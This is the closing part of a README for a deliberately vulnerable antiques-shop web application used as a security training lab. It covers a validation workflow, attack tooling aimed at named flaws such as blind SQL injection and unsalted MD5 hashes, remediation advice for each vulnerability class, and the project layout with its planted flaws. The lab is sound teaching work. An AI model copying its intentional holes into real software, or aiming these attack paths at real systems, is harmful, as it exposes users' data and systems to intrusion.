    reached via SSRF) to show how a low-severity access-control bug
    becomes a full secrets leak.

### Validation Workflow
For each exercise:
1. Identify the vulnerable endpoint from the matrix above.
2. Reproduce the listed verification steps and confirm the *impact*, not
   just that a request succeeded.
3. For the two bounded vulnerabilities (#1, #12), also confirm the
   guardrail correctly *rejects* out-of-scope attempts -- this is as
   important a lab outcome as confirming the in-scope ones work.
4. Check `logs/app.log` to see what evidence (if any) the attack left
   behind -- and note where the app itself over-logs (#23).
5. Write a one-paragraph remediation for the specific line(s) of code
   responsible (see below for the general fix per CWE).

### Recommended Tooling
- **Burp Suite Community/Pro** or **OWASP ZAP** -- proxying, repeater, active scanning
- **sqlmap** -- automating the blind SQL injection in `/api/artifacts/timeline?era=`
- **hashcat** / **John the Ripper** -- cracking the unsalted MD5 hashes
- **curl** / **httpie** -- scripted PoC requests (used throughout this README)
- **npm audit** -- dependency vulnerability scanning against both `package.json` files
- A browser devtools console -- inspecting cookies, CORS headers, and the DOM for XSS

### Secure Coding Remediation Guidance (summary)

| Vulnerability | Remediation |
|---|---|
| SQL Injection | Use parameterized queries (`?` placeholders via `mysql2`) everywhere -- for ORDER BY / column-name inputs, validate against a strict allowlist of real column names instead of concatenating |
| XSS (reflected/stored) | Never use `dangerouslySetInnerHTML` on user input; let React's default text rendering escape it, or run it through a real sanitizer (e.g. DOMPurify) allowlisting only safe tags/attributes |
| Command Injection | Avoid `exec()`/`shell: true`; use `execFile()` with an argument array, never string-concatenate user input into a shell command |
| Path Traversal | Resolve and validate that the final path stays inside the intended directory using `path.resolve` + a prefix check; never trust a user-supplied filename directly |
| CSRF | Use a CSRF token library (e.g. `csurf` or double-submit cookie pattern) and validate the `Origin`/`Referer` header on state-changing requests -- including "convenience" one-click actions, not just settings forms |
| Insecure Deserialization | Never evaluate untrusted input as code (`vm`, `eval`, `Function()`); use `JSON.parse` for data and validate/allowlist the resulting shape |
| Weak Hashing | Use `bcrypt`, `scrypt`, or `argon2` with per-user salts, never raw MD5/SHA1 |
| Session Fixation | Always regenerate the session identifier on login (`req.session.regenerate()`); never accept a client-supplied session id |
| SSRF | Allow-list destination hosts/schemes; block link-local and internal ranges; disable redirects |
| Directory Listing / Debug Endpoints | Disable autoindexing; require authentication + authorization on every diagnostic route, however innocuous its name sounds |
| Verbose Errors | Return a generic error message to users; log full details server-side only, behind access controls |
| Sensitive Data in Logs | Never log raw passwords, tokens, or secrets -- log user IDs/event types instead |
| Clickjacking | Set `X-Frame-Options: DENY` or a `frame-ancestors 'none'` CSP directive globally (e.g. via the `helmet` middleware) |
| Privilege Assignment | Never trust client-supplied role/permission fields; assign roles server-side only, based on authenticated context |

---

## 6. Project Structure

```
antiques/
├── backend/
│   ├── server.js               # Main Express application (all routes + vulnerabilities)
│   ├── seed.js                 # Database schema application + seed data (Node)
│   ├── package.json             # Backend dependencies (intentionally old/vulnerable pins)
│   ├── config/
│   │   └── schema.sql           # MySQL table definitions
│   ├── certificates/            # Certificate-of-authenticity images (path traversal lab target)
│   ├── appraisals/
│   │   └── sample-appraisal-report.txt
│   ├── uploads/                 # User-uploaded avatars (directory-listing lab target)
│   └── logs/
│       └── app.log              # Application log (contains logged secrets -- see #23)
├── frontend/
│   ├── index.html               # HTML shell (contains #5 hint comment)
│   ├── vite.config.js           # Dev server + API proxy config
│   ├── package.json              # Frontend dependencies
│   ├── public/
│   │   └── images/
│   │       ├── hero.jpg
│   │       ├── default-avatar.jpg
│   │       └── products/*.jpg    # 12 downloaded antique/artifact product photos
│   └── src/
│       ├── main.jsx
│       ├── App.jsx               # Routing + session context
│       ├── index.css             # Curated-gallery burgundy/brass/parchment design system
│       ├── api/
│       │   └── client.js         # Fetch wrapper for all backend endpoints
│       ├── components/
│       │   ├── Navbar.jsx
│       │   └── Footer.jsx
│       └── pages/
│           ├── HomePage.jsx, ShopPage.jsx, ArtifactPage.jsx, SearchPage.jsx
│           ├── AppraisalQuotePage.jsx
│           ├── LoginPage.jsx, RegisterPage.jsx, ForgotPasswordPage.jsx, ResetPasswordPage.jsx
│           ├── AccountPage.jsx, WishlistPage.jsx, CartPage.jsx, CheckoutPage.jsx
│           ├── OrderConfirmationPage.jsx, AdminDashboardPage.jsx
│           └── NotFoundPage.jsx
├── docker-compose.yml
├── README.md                    # This file
└── start.sh                     # One-command local startup helper
```

---

## 7. Legal & Ethical Use

This application must only be used:
- On an isolated lab network, a local VM, or `localhost`
- Against systems and by people you have explicit authorization to test
- For educational, training, or authorized assessment purposes

Do not deploy this application where it is reachable by anyone other than
authorized lab participants. Do not scan, attack, or otherwise test any
system you do not own or have written permission to test.
